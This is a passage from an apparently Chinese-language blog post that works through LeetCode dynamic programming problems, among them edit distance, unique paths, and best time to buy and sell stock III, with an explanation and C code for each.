class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">helper</span><span class="hljs-params">(<span class="hljs-type">char</span> *s, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right, <span class="hljs-type">int</span> *start, <span class="hljs-type">int</span> *len)</span> &#123;<br>    <span class="hljs-keyword">while</span> (left &gt;= <span class="hljs-number">0</span> &amp;&amp; right &lt; N &amp;&amp; s[left] == s[right])<br>        left--, right++;<br>    <span class="hljs-keyword">if</span> (right - left - <span class="hljs-number">1</span> &gt; *len) &#123;  <span class="hljs-comment">// 如果找到更长的子串，保存其信息</span><br>        *start = left + <span class="hljs-number">1</span>;<br>        *len = right - left - <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">longestPalindrome</span><span class="hljs-params">(<span class="hljs-type">char</span> * s)</span>&#123;<br>    <span class="hljs-type">int</span> N = <span class="hljs-built_in">strlen</span>(s), start = <span class="hljs-number">0</span>, len = <span class="hljs-number">0</span>;  <span class="hljs-comment">// N 字符串长度， start 子串起始位置， len 子串长度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)     <span class="hljs-comment">// 奇数长度的回文子串</span><br>        helper(s, N, i<span class="hljs-number">-1</span>, i+<span class="hljs-number">1</span>, &amp;start, &amp;len);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)     <span class="hljs-comment">// 偶数长度的回文子串</span><br>        helper(s, N, i, i+<span class="hljs-number">1</span>, &amp;start, &amp;len);<br>    s[start + len] = <span class="hljs-string">&#x27;\0&#x27;</span>;          <span class="hljs-comment">// 原地修改返回</span><br>    <span class="hljs-keyword">return</span> s + start;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-最大子序和"><a href="#3-最大子序和" class="headerlink" title="3.最大子序和"></a>3.最大子序和</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。<br>示例:<br>输入: [-2,1,-3,4,-1,2,1,-5,4],<br>输出: 6<br>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p><p>来源：<a href="https://leetcode-cn.com/problems/maximum-subarray/">https://leetcode-cn.com/problems/maximum-subarray/</a></p><h3 id="3-2思路"><a href="#3-2思路" class="headerlink" title="3.2思路"></a>3.2思路</h3><p>动态规划的是首先对数组进行遍历，当前最大连续子序列和为 sum，结果为 result<br>如果 sum &gt; 0，则说明 sum 对结果有增益效果，则 sum 保留并加上当前遍历数字<br>如果 sum &lt;&#x3D; 0，则说明 sum 对结果无增益效果，需要舍弃，则 sum 直接更新为当前遍历数字<br>每次比较 sum 和 result的大小，将最大值置为result，遍历结束返回结果<br>时间复杂度：O(n)</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">maxSubArray</span><span class="hljs-params">(<span class="hljs-type">int</span>* num, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,result = num[<span class="hljs-number">0</span>],sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;numsSize)&#123;<br>        <span class="hljs-keyword">if</span>(sum &gt;= <span class="hljs-number">0</span>)&#123;<br>            sum+=num[i];<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            sum = num[i];<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(sum&gt;result)&#123;<br>            result = sum;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-不同路径"><a href="#4-不同路径" class="headerlink" title="4.不同路径"></a>4.不同路径</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>一个机器人位于一个 m x n 网格的左上角 。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角。<br>问总共有多少条不同的路径？</p><p>示例 1:<br>输入: m &#x3D; 3, n &#x3D; 2<br>输出: 3<br>解释:<br>从左上角开始，总共有 3 条路径可以到达右下角。</p><p>向右 -&gt; 向右 -&gt; 向下</p><p>向右 -&gt; 向下 -&gt; 向右</p><p>向下 -&gt; 向右 -&gt; 向右</p><p>示例 2:<br>输入: m &#x3D; 7, n &#x3D; 3<br>输出: 28</p><h3 id="4-2思路"><a href="#4-2思路" class="headerlink" title="4.2思路"></a>4.2思路</h3><p>第一个想到的直接计算阶乘即可，由于只能向右或者向下，那么根据数学知识可以很容易算出来结果，就是da。由于本章练习的是动态规划算法，所以还是用动态规划来写吧。</p><p>首先找到递推式，就是dp[i][j] &#x3D; dp[i-1][j] + dp[i][j-1];</p><p>然后如果在最上面一行或者最左面，那么结果就是1。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePaths</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span>&#123;<br>    <span class="hljs-comment">//动态创建一个二维路径答案表</span><br>    <span class="hljs-comment">/*int **dp = (int **)malloc(sizeof(int *) * n);</span><br><span class="hljs-comment">    for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="hljs-comment">        dp[i] = (int *)malloc(sizeof(int) * m);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">//最上一行或者最左一列</span><br>                dp[i][j] = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                dp[i][j] = dp[i<span class="hljs-number">-1</span>][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-comment">//返回最后一个结果</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-不同路径升级版"><a href="#5-不同路径升级版" class="headerlink" title="5.不同路径升级版"></a>5.不同路径升级版</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。<br>现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？</p><p>网格中的障碍物和空位置分别用 1 和 0 来表示。</p><p>输入:<br>[<br>  [0,0,0],<br>  [0,1,0],<br>  [0,0,0]<br>]<br>输出: 2<br>解释:<br>3x3 网格的正中间有一个障碍物。<br>从左上角到右下角一共有 2 条不同的路径：</p><ol><li>向右 -&gt; 向右 -&gt; 向下 -&gt; 向下</li><li>向下 -&gt; 向下 -&gt; 向右 -&gt; 向右</li></ol><h3 id="5-2思路"><a href="#5-2思路" class="headerlink" title="5.2思路"></a>5.2思路</h3><p>和前面的差不多，只不过加了障碍，把有障碍的地方去掉，dp[i][j]&#x3D;0，然后先把第一行和第一列初始化完毕，不能和上面的一样一起初始化了。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePathsWithObstacles</span><span class="hljs-params">(<span class="hljs-type">int</span>** obstacleGrid, <span class="hljs-type">int</span> obstacleGridSize, <span class="hljs-type">int</span>* obstacleGridColSize)</span>&#123;<br>    <span class="hljs-type">int</span> n = obstacleGridSize,m = *obstacleGridColSize;<span class="hljs-comment">//n行，m列</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">int</span> dp[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> || obstacleGrid[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>] == <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;     <span class="hljs-comment">//设置第一行的边界</span><br>        <span class="hljs-keyword">if</span>(obstacleGrid[i][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)&#123;<br>            dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)&#123;     <span class="hljs-comment">//设置第一列的边界</span><br>        <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][i] == <span class="hljs-number">0</span>)&#123;<br>            dp[<span class="hljs-number">0</span>][i] = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>);   <span class="hljs-comment">//最上一行或者最左一列</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(obstacleGrid[i][j] == <span class="hljs-number">1</span>)&#123;<br>                dp[i][j] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                dp[i][j] = dp[i<span class="hljs-number">-1</span>][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-comment">//返回最后一个结果</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-最小路径和"><a href="#6-最小路径和" class="headerlink" title="6.最小路径和"></a>6.最小路径和</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定一个包含非负整数的 m x n 网格，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。<br>说明：每次只能向下或者向右移动一步。<br>示例:<br>输入:<br>[<br>  [1,3,1],<br>  [1,5,1],<br>  [4,2,1]<br>]<br>输出: 7<br>解释: 因为路径 1→3→1→1→1 的总和最小。</p><p>来源：<a href="https://leetcode-cn.com/problems/minimum-path-sum/">https://leetcode-cn.com/problems/minimum-path-sum/</a></p><h3 id="6-2思路"><a href="#6-2思路" class="headerlink" title="6.2思路"></a>6.2思路</h3><p>使用动态规划算法，dp数组记录该点到起始点的最短距离，边界时候单独处理，非边界取上一次计算的最小值加上本点的值即可。思路清晰代码也很简单。dp数组可以使用malloc动态分配即可，偷懒直接申请了一个挺大的空间。时间复杂度为遍历二维数组花费时间。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b)(a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minPathSum</span><span class="hljs-params">(<span class="hljs-type">int</span>** grid, <span class="hljs-type">int</span> gridSize, <span class="hljs-type">int</span>* gridColSize)</span>&#123;<br>    <span class="hljs-type">int</span> m = gridSize,n = *gridColSize;<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; m;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; n;j++)&#123;<br>            <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span> &amp;&amp; j==<span class="hljs-number">0</span> )&#123;<br>                dp[i][j] = grid[i][j];<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = grid[i][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = grid[i][j] + dp[i<span class="hljs-number">-1</span>][j];<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                dp[i][j] = min(dp[i<span class="hljs-number">-1</span>][j],dp[i][j<span class="hljs-number">-1</span>]) + grid[i][j];<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-编辑距离"><a href="#7-编辑距离" class="headerlink" title="7.编辑距离"></a>7.编辑距离</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>给定两个单词 word1 和 word2，计算出将 word1 转换成 word2 所使用的最少操作数 。<br>你可以对一个单词进行如下三种操作：<br>插入一个字符<br>删除一个字符<br>替换一个字符<br>示例 1:<br>输入: word1 &#x3D; “horse”, word2 &#x3D; “ros”<br>输出: 3<br>解释:<br>horse -&gt; rorse (将 ‘h’ 替换为 ‘r’)<br>rorse -&gt; rose (删除 ‘r’)<br>rose -&gt; ros (删除 ‘e’)<br>示例 2:<br>输入: word1 &#x3D; “intention”, word2 &#x3D; “execution”<br>输出: 5<br>解释:<br>intention -&gt; inention (删除 ‘t’)<br>inention -&gt; enention (将 ‘i’ 替换为 ‘e’)<br>enention -&gt; exention (将 ‘n’ 替换为 ‘x’)<br>exention -&gt; exection (将 ‘n’ 替换为 ‘c’)<br>exection -&gt; execution (插入 ‘u’)</p><p>来源：<a href="https://leetcode-cn.com/problems/edit-distance/">https://leetcode-cn.com/problems/edit-distance/</a></p><h3 id="7-2思路"><a href="#7-2思路" class="headerlink" title="7.2思路"></a>7.2思路</h3><p><strong>动态规划：</strong></p><p>dp[i][j] 代表 word1 到 i 位置转换成 word2 到 j 位置需要最少步数<br>所以，<br>当 word1[i] &#x3D;&#x3D; word2[j]，dp[i][j] &#x3D; dp[i-1][j-1]；<br>当 word1[i] !&#x3D; word2[j]，dp[i][j] &#x3D; min(dp[i-1][j-1], dp[i-1][j], dp[i][j-1]) + 1<br>其中，dp[i-1][j-1]到dp[i][j]需要进行替换操作，dp[i-1][j]到d[i][j]需要进行删除操作，dp[i][j-1] 到d[i][j]需要进行添加操作。</p><p><img src="/%5Cimages%5Cdp7.png"></p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minDistance</span><span class="hljs-params">(<span class="hljs-type">char</span> * word1, <span class="hljs-type">char</span> * word2)</span>&#123;<br>    <span class="hljs-type">int</span> n1 = <span class="hljs-built_in">strlen</span>(word1);<br>    <span class="hljs-type">int</span> n2 = <span class="hljs-built_in">strlen</span>(word2);<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">600</span>][<span class="hljs-number">600</span>];<br>    <span class="hljs-comment">// 第一行初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n2; j++) dp[<span class="hljs-number">0</span>][j] = dp[<span class="hljs-number">0</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 第一列初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i++) dp[i][<span class="hljs-number">0</span>] = dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n2; j++) &#123;<br>            <span class="hljs-keyword">if</span> (word1[i <span class="hljs-number">-1</span>] == word2[j - <span class="hljs-number">1</span>]) <br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">else</span> <br>                dp[i][j] = min(min(dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>], dp[i][j - <span class="hljs-number">1</span>]), dp[i - <span class="hljs-number">1</span>][j]) + <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n1][n2];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-买卖股票的最佳时机"><a href="#8-买卖股票的最佳时机" class="headerlink" title="8.买卖股票的最佳时机"></a>8.买卖股票的最佳时机</h2><h3 id="8-1题目描述"><a href="#8-1题目描述" class="headerlink" title="8.1题目描述"></a>8.1题目描述</h3><p>给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。</p><p>设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。</p><p>注意: 你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。</p><p><strong>示例 1:</strong></p><p>输入: [3,3,5,0,0,3,1,4]<br>输出: 6<br>解释: 在第 4 天（股票价格 &#x3D; 0）的时候买入，在第 6 天（股票价格 &#x3D; 3）的时候卖出，这笔交易所能获得利润 &#x3D; 3-0 &#x3D; 3 。</p><p>随后，在第 7 天（股票价格 &#x3D; 1）的时候买入，在第 8 天 （股票价格 &#x3D; 4）的时候卖出，这笔交易所能获得利润 &#x3D; 4-1 &#x3D; 3 。</p><p><strong>示例 2:</strong></p><p>输入: [1,2,3,4,5]<br>输出: 4<br>解释: 在第 1 天（股票价格 &#x3D; 1）的时候买入，在第 5 天 （股票价格 &#x3D; 5）的时候卖出, 这笔交易所能获得利润 &#x3D; 5-1 &#x3D; 4 。<br>     注意你不能在第 1 天和第 2 天接连购买股票，之后再将它们卖出。<br>     因为这样属于同时参与了多笔交易，你必须在再次购买前出售掉之前的股票。</p><p><strong>示例 3:</strong></p><p>输入: [7,6,4,3,1]<br>输出: 0<br>解释: 在这个情况下, 没有交易完成, 所以最大利润为 0。</p><p>来源：<a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii">https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-iii</a></p><h3 id="8-2思路分析"><a href="#8-2思路分析" class="headerlink" title="8.2思路分析"></a>8.2思路分析</h3><p>每天我们其实是有四个状态，买入当前价格的股票，以当前价格的股票卖出。第二次买入股票，第二次卖出股票。</p><p><img src="/%5Cimages%5Cdp8.jpg"></p><p>s0代表初始状态，初始时钱是 0。s1代表第一次买入后当前的钱，s2代表第一次卖出后当前的前，s3代表第二次买入后当前的钱，s4代表第二次卖出后当前的钱。然后我们只需要更新每天的这四个状态即可。</p><h3 id="8-3代码"><a href="#8-3代码" class="headerlink" title="8.3代码"></a>8.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> max(a,b) (a&gt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span>* prices, <span class="hljs-type">int</span> pricesSize)</span>&#123;<br>    <span class="hljs-keyword">if</span>(pricesSize == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//进行初始化，第一天 s1 将股票买入，其他状态全部初始化为最小值</span><br>    <span class="hljs-type">int</span> s1=-prices[<span class="hljs-number">0</span>],s2=<span class="hljs-number">-2147483648</span>,s3=<span class="hljs-number">-2147483648</span>,s4=<span class="hljs-number">-2147483648</span>;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;pricesSize;++i) &#123;            <br>        s1 = max(s1, -prices[i]); <span class="hljs-comment">//买入价格更低的股</span><br>        s2 = max(s2, s1+prices[i]); <span class="hljs-comment">//卖出当前股，或者不操作</span><br>        s3 = max(s3, s2-prices[i]); <span class="hljs-comment">//第二次买入，或者不操作</span><br>        s4 = max(s4, s3+prices[i]); <span class="hljs-comment">//第二次卖出，或者不操作</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> max(<span class="hljs-number">0</span>,s4);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="9-三角形最小路径和"><a href="#9-三角形最小路径和" class="headerlink" title="9.三角形最小路径和"></a>9.三角形最小路径和</h2><h3 id="9-1题目描述"><a href="#9-1题目描述" class="headerlink" title="9.1题目描述"></a>9.1题目描述</h3><p>给定一个三角形，找出自顶向下的最小路径和。每一步只能移动到下一行中相邻的结点上。</p><p>例如，给定三角形：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[</span><br><span class="hljs-comment">     <span class="hljs-comment">[2]</span>,</span><br><span class="hljs-comment">    <span class="hljs-comment">[3,4]</span>,</span><br><span class="hljs-comment">   <span class="hljs-comment">[6,5,7]</span>,</span><br><span class="hljs-comment">  <span class="hljs-comment">[4,1,8,3]</span></span><br><span class="hljs-comment">]</span><br></code></pre></td></tr></table></figure><p>自顶向下的最小路径和为 11（即，2 + 3 + 5 + 1 &#x3D; 11）。</p><p>来源：<a href="https://leetcode-cn.com/problems/triangle">https://leetcode-cn.com/problems/triangle</a></p><h3 id="9-2思路"><a href="#9-2思路" class="headerlink" title="9.2思路"></a>9.2思路</h3><p>从倒数第二行开始计算每个数字到下一个节点的最小值，并加上当前节点值存入当前节点，最后triangle[0][0]中存储的就是最终的最短路径结果。</p><h3 id="9-3代码"><a href="#9-3代码" class="headerlink" title="9.3代码"></a>9.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minimumTotal</span><span class="hljs-params">(<span class="hljs-type">int</span>** triangle, <span class="hljs-type">int</span> triangleSize, <span class="hljs-type">int</span>* triangleColSize)</span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br><span class="hljs-comment">//自底向上</span><br>    <span class="hljs-keyword">for</span>(i = triangleSize<span class="hljs-number">-2</span>;i &gt;= <span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j &lt; triangleColSize[i];j++ )&#123;<br>            triangle[i][j] = min(triangle[i+<span class="hljs-number">1</span>][j],triangle[i+<span class="hljs-number">1</span>][j+<span class="hljs-number">1</span>])+triangle[i][j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> triangle[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="10-最大正方形"><a href="#10-最大正方形" class="headerlink" title="10.最大正方形"></a>10.最大正方形</h2><h3 id="10-1题目描述"><a href="#10-1题目描述" class="headerlink" title="10.1题目描述"></a>10.1题目描述</h3><p>在一个由 0 和 1 组成的二维矩阵内，找到只包含 1 的最大正方形，并返回其面积。</p><p>示例:</p><p>输入: </p><p>1 0 1 0 0<br>1 0 1 1 1<br>1 1 1 1 1<br>1 0 0 1 0</p><p>输出: 4</p><p>来源：<a href="https://leetcode-cn.com/problems/maximal-square">https://leetcode-cn.com/problems/maximal-square</a></p><h3 id="10-2思路分析"><a href="#10-2思路分析" class="headerlink" title="10.2思路分析"></a>10.2思路分析</h3><p>第一想法就是使用动态规划算法，将dp初始化为全零（不初始化直接用会导致测试时出错），如果当前点是1，然后dp[i][j] 取左侧、左上角、上侧最小值加一为当前点dp值，如果当前dp值大于maxqlen就将maxqlen置为当前dp值。最后返回maxqlen*maxqlen即可。中间最开始看错了输汝，以为矩阵里面是整形导致一直判断出错，要细心啊。</p><h3 id="10-3代码"><a href="#10-3代码" class="headerlink" title="10.3代码"></a>10.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 